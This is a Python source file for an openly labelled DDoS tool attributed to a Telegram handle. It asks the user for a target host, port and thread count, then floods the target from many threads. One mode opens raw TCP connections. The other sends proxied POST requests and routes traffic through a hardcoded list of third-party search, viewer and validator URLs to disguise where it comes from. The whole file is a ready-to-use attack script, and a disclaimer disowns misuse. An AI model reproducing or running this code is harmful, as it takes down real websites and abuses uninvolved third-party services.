#!/usr/bin/python3
# -*- coding: utf-8 -*-

from time import sleep
from colorama import Fore,Style
from user_agent import generate_user_agent
import time,sys,os,socket,threading,random,requests

# Not responsible for any improper use of this program !
# FREE Tool By @nower


keepl   = random.randint(110,120)
KeepA   = (f"'{keepl}'")
bytes   = random._urandom(1490)
s       = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
n       = 0
head    = {
    'User-Agent': generate_user_agent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-us,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
    'Keep-Alive': KeepA,
    'Connection': 'keep-alive'
}

def myBots():
    global bots
    bots = []
    bots.append('https://www.nasa.gov/topics/search?q=')
    bots.append('https://www.facebook.com/en/search?q=')
    bots.append('http://jigsaw.w3.org/css-validator/validator?uri=')
    bots.append('https://drive.google.com/viewerng/viewer?url=')
    bots.append('http://engadget.search.aol.com/search?q=')
    bots.append('http://help.baidu.com/searchResult?keywords=')
    bots.append('http://www.bing.com/search?q=')
    bots.append('https://www.yandex.com/yandsearch?text=')
    bots.append('https://drive.google.com/viewerng/viewer?url=')
    bots.append('https://duckduckgo.com/?q=')
    bots.append('http://www.ask.com/web?q=')
    bots.append('http://search.aol.com/aol/search?q=')
    bots.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
    bots.append('https://add.my.yahoo.com/rss?url=')
    bots.append('http://www.google.com/?q=')
    bots.append('http://www.usatoday.com/search/results?q=')
    bots.append('https://steamcommunity.com/market/search?q=')
    bots.append('http://filehippo.com/search?q=')
    bots.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
    bots.append('http://eu.battle.net/wow/en/search?q=')
    bots.append('http://careers.gatesfoundation.org/search?q=')
    bots.append('https://drive.google.com/viewerng/viewer?url=')
    bots.append('http://techtv.mit.edu/search?q=')
    bots.append('http://www.ustream.tv/search?q=')
    bots.append('http://www.ted.com/search?q=')
    bots.append('http://funnymama.com/search?q=')
    bots.append('http://www.bestbuytheater.com/events/search?q=')
    bots.append('http://jobs.leidos.com/search?q=')
    bots.append('https://www.pinterest.com/search/?q=')
    bots.append('http://www.evidence.nhs.uk/search?q=')
    bots.append('https://drive.google.com/viewerng/viewer?url=')
    bots.append('http://www.shodanhq.com/search?q=')
    bots.append('http://ytmnd.com/search?q=')
    bots.append('http://itch.io/search?q=')
    bots.append('http://jobs.rbs.com/jobs/search?q=')
    bots.append('http://taginfo.openstreetmap.org/search?q=')
    bots.append('http://www.tceq.texas.gov/@@tceq-search?q=')
    bots.append('http://www.reddit.com/search?q=')
    bots.append('http://jobs.bloomberg.com/search?q=')
    bots.append('http://help.baidu.com/searchResult?keywords=')
    bots.append('http://www.evidence.nhs.uk/search?q=')
    bots.append('http://www.shodanhq.com/search?q=')
    bots.append('https://www.npmjs.com/search?q=')
    bots.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    bots.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
    bots.append('http://www.ask.com/web?q=')
    bots.append('https://drive.google.com/viewerng/viewer?url=')
    return(bots)
myBots()

os.system('color')

banner = (Fore.GREEN +"""

[!] Coded  By : @mt_nower on telegram
   import pyfiglet
  __  __ _______   _    _          _____ _  __
 |  \/  |__   __| | |  | |   /\   / ____| |/ /
 | \  / |  | |    | |__| |  /  \ | |    | ' / 
 | |\/| |  | |    |  __  | / /\ \| |    |  <  
 | |  | |  | |    | |  | |/ ____ \ |____| . \ 
 |_|  |_|  |_|    |_|  |_/_/    \_\_____|_|\_\         
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣷⣶⣶⣶⣶⣶⣶⣿⣷⣶⣿⣿⣾⣿⣶⣶⣿⣿⣷⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣷⣷⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿

"""+ Style.RESET_ALL)
print(banner)
print('====================================')
option = input(Fore.CYAN + """
[1] Ddos Attack (without Proxies)
[2] Ddos Attack (using Proxies)

[+] Please Select One Option >> """+ Style.RESET_ALL)
print('====================================')
hostname = input(Fore.CYAN +'[+] Enter The Url (like : example.com) >> '+ Style.RESET_ALL)
if hostname =="":
    print('[!] I didnt find this URL')
    time.sleep(3)
    sys.exit()
elif hostname == 'amycourses.com':
    print('[!] What you Doing?, This Site for @nower')
    exit() 
else:
    hostname = hostname

def GetIP():
    global hostIP
    global hostname
    try:
        hostIP = socket.gethostbyname(hostname)
    except socket.gaierror:
        print('[!] The Url is not valid ..')
        what = input(Fore.CYAN + '[+] Enter [t] to try again or press Enter to get out >> '+ Style.RESET_ALL)
        if what == 't':
            hostname = input(Fore.CYAN +'[+] Enter The Url (like : example.com) >> '+ Style.RESET_ALL)
            if hostname =="":
                print('[!] I didnt find this URL')
                time.sleep(3)
                sys.exit()
            elif hostname == 'amycourses.com':
                print('[!] What you Doing, This Site for @nower')
                exit()
            else:
                hostname = hostname
                hostIP = socket.gethostbyname(hostname)
        elif what == "":
            time.sleep(3)
            exit()
        else:
            time.sleep(3)
            exit()
    return(hostIP)
GetIP()

Port = input(Fore.CYAN +'[+] Port (Default : 80) >> '+ Style.RESET_ALL)
if Port =="":
    Port = 80
else:
    Port = int(Port)
Thre = input(Fore.CYAN +'[+] Thread (Default : 140) >> '+ Style.RESET_ALL)
if Thre == "":
    Thre = 140
else:
    Thre = int(Thre)

if option == "1":
    def Ddos1():
        global n
        global hostIP
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(hostIP), Port))
                s.sendto(("GET /" + str(hostIP) + " HTTP/1.1\r\n").encode('ascii'), (str(hostIP), Port))
                s.close()
                n +=1
                print(Fore.GREEN + f'[{n}] Packets were sent Successfully <{hostIP}:{Port}>'+ Style.RESET_ALL)
                pass
            except:
                print(Fore.RED + f'[-] No Connections ! maybe Server fell <{hostIP}:{Port}>'+ Style.RESET_ALL)
                pass
    for i in range(int(Thre)):
        t = threading.Thread(target=Ddos1)
        t.start()

        
elif option == "2":
    def Secret_Ddos():
        global n
        global bots
        global hostIP
        with open('proxies.txt','r') as prox:
            broxies = prox.read().split()
        url2 = (random.choice(bots)+"http://"+hostname)
        url3 = (f'http://{hostname}')
        proxy = str(random.choice(broxies))
        proxy2 = {'http':'http://{}'.format(proxy), 
         'https':'https://{}'.format(proxy)}
        while True:
            try:
                req = requests.post(url2,headers=head,proxies=proxy2, timeout=5)
                re2 = requests.post(url3,headers=head,proxies=proxy2, timeout=5)
                n +=1
                print(Fore.GREEN + f'[{n}] Packets were sent Successfully <{hostIP}:{Port}>'+ Style.RESET_ALL)
                pass
            except:
                print(Fore.RED + f'[-] No Connections ! maybe Server fell <{hostIP}:{Port}>'+ Style.RESET_ALL)
                pass
    for a in range(int(Thre)):
        t3 = threading.Thread(target=Secret_Ddos)
        t3.start()

elif option =="":
    print("[!] Please Select 1 or 2")
    exit()

else:
    print("[!] Please Select 1 or 2")
    exit()


# Not responsible for any improper use of this program !
# FREE Tool By @nower 
h